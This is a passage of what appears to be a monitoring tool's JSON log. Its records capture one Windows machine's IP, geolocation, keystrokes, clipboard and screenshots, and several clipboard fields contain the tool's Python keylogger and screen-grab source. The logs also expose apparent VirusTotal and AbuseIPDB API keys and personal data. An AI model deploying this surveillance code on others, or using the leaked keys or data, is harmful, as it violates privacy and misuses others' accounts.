logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "fa0f1dcdaa3613bb429393bd0c5d12b6604b63ba7e06e3b07a5363d7b19ebd08", "screenshot_hash": "d0383877ba6b6efb00a97cc374882f30e1c4ec8eb90924884aba4cefdfc30a7d", "log_hash": "d3434142043ad235d28a93874beafef007437930d3d946fa6637b818ce96efa4"}
{"timestamp": "2025-05-21T12:55:09.610930", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"your_abuseipdb_api_key_here\"\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "\u0003ip lookup", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "fa0f1dcdaa3613bb429393bd0c5d12b6604b63ba7e06e3b07a5363d7b19ebd08", "screenshot_hash": "63bbd26c7275fb853dfad948d0fae169c54f2c03b14d2879f788a0c87140a7a1", "log_hash": "6a10d877784350ed3fd91ace7811498d9ad39cfdf4fb4b943f0648860672c8de"}
{"timestamp": "2025-05-21T12:55:35.812451", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "2.83.128.150", "keystrokes": "what ubut yetsterda", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "417734eb87da5722e3f9d240bf078c31eecab700d53c2146f7f420872f7660da", "screenshot_hash": "35931a7a74334bfdc97bc270449fe458550ead8f6a804cc8a77b00baaea60636", "log_hash": "19f5fa24e6fa04e8c709edcac4c59e77a8d937872e5bf27d196d30a72095774a"}
{"timestamp": "2025-05-21T12:56:02.109720", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "2.83.128.150", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "417734eb87da5722e3f9d240bf078c31eecab700d53c2146f7f420872f7660da", "screenshot_hash": "eb703aa282ac3865388c4447986dec60c8126cc2e5cf82faefce8bb6ef4b166a", "log_hash": "ceaef486d323f2e792c7cf8fb734bde0a930c5dcf778e5120f60f88c11f0c717"}
{"timestamp": "2025-05-21T12:58:43.191862", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40", "keystrokes": "oeve ", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "41d8416f401512a251f9dffd53e617cf9c05cb06a240b66c6472c5008eedc52d", "screenshot_hash": "3abc8f6540b3cda6ee30847f0be2f3b632224c89ac88a9a3daff79c234e5808d", "log_hash": "612fcd7a79c4ba60a9749a52724eb4780fc673ea7b19bb0f9a1a2f635e082f16"}
{"timestamp": "2025-05-21T12:59:09.959564", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "41d8416f401512a251f9dffd53e617cf9c05cb06a240b66c6472c5008eedc52d", "screenshot_hash": "223f1386df36fad8ce1aef1eaec66c83bc3e1ce211083a57a82bf37fb0ca71a6", "log_hash": "83ba8c231259f9f21364809e1287d42a149543ccfa9d71c15a164799949b3aa0"}
{"timestamp": "2025-05-21T12:59:35.975542", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "41d8416f401512a251f9dffd53e617cf9c05cb06a240b66c6472c5008eedc52d", "screenshot_hash": "8539bfff32104361eef646bed84be9d4df33c4296d1372e6962723daa2dd73ed", "log_hash": "cb895a8017c8bad39ca41014e29574f674d0df871cf40af1268a9476b03bd858"}
{"timestamp": "2025-05-21T13:01:25.371274", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "private_ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "hostname = socket.gethostname()\r\nsession_log[\"system\"][\"hostname\"] = hostname\r\n\r\n# Get both IPv4 and IPv6 addresses\r\ntry:\r\n    addr_info = socket.getaddrinfo(hostname, None)\r\n    ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n    ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n    session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n    session_log[\"system\"][\"private_ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\nexcept Exception as e:\r\n    session_log[\"system\"][\"private_ip_v4\"] = \"Error\"\r\n    session_log[\"system\"][\"private_ip_v6\"] = f\"Error: {e}\"\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "0e5783a7812d7528a53218a48c0ce01a20a7b815a911841a798d76a648afa779", "screenshot_hash": "8c7be5a4e18cdc445098a16a1d74f9f870688eb147dbaa6802c5fbd33ecddbad", "log_hash": "5b10bdb7b428c1b14081fadaafdbe28f39d93e8b1dde4c8b37f116fe128b0e17"}
{"timestamp": "2025-05-21T13:01:51.766150", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "private_ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "hostname = socket.gethostname()\r\nsession_log[\"system\"][\"hostname\"] = hostname\r\n\r\n# Get both IPv4 and IPv6 addresses\r\ntry:\r\n    addr_info = socket.getaddrinfo(hostname, None)\r\n    ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n    ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n    session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n    session_log[\"system\"][\"private_ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\nexcept Exception as e:\r\n    session_log[\"system\"][\"private_ip_v4\"] = \"Error\"\r\n    session_log[\"system\"][\"private_ip_v6\"] = f\"Error: {e}\"\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "0e5783a7812d7528a53218a48c0ce01a20a7b815a911841a798d76a648afa779", "screenshot_hash": "cffd5029c36c54c545a3d6d7a1add68ee29bcc745a6a4d1e8f6fcd3a5618bf06", "log_hash": "69c66d93f64187a4d5c08e25000d4ef0507de4bd808730a7db59bb5f377d2a27"}
{"timestamp": "2025-05-22T17:44:57.345678", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snakey\u00b4", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "843cf45911a6cd82358a9e733a9a67fbbe4fcefe8df0ae1c5aee264e2f1d1436", "log_hash": "4974b3331a50905fec3b0bee7f866b8fe5e3af4c8d7202c95824d9ecfff51e45"}
{"timestamp": "2025-05-22T18:55:58.003992", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "fe80::89c1:9b43:6c7e:e819", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(base_path, \"malware_rules.yar\")\r\nyara_scan_dirs = [\"C:/Windows\", \"C:/Program Files\", \"C:/Program Files (x86)\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\"\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n      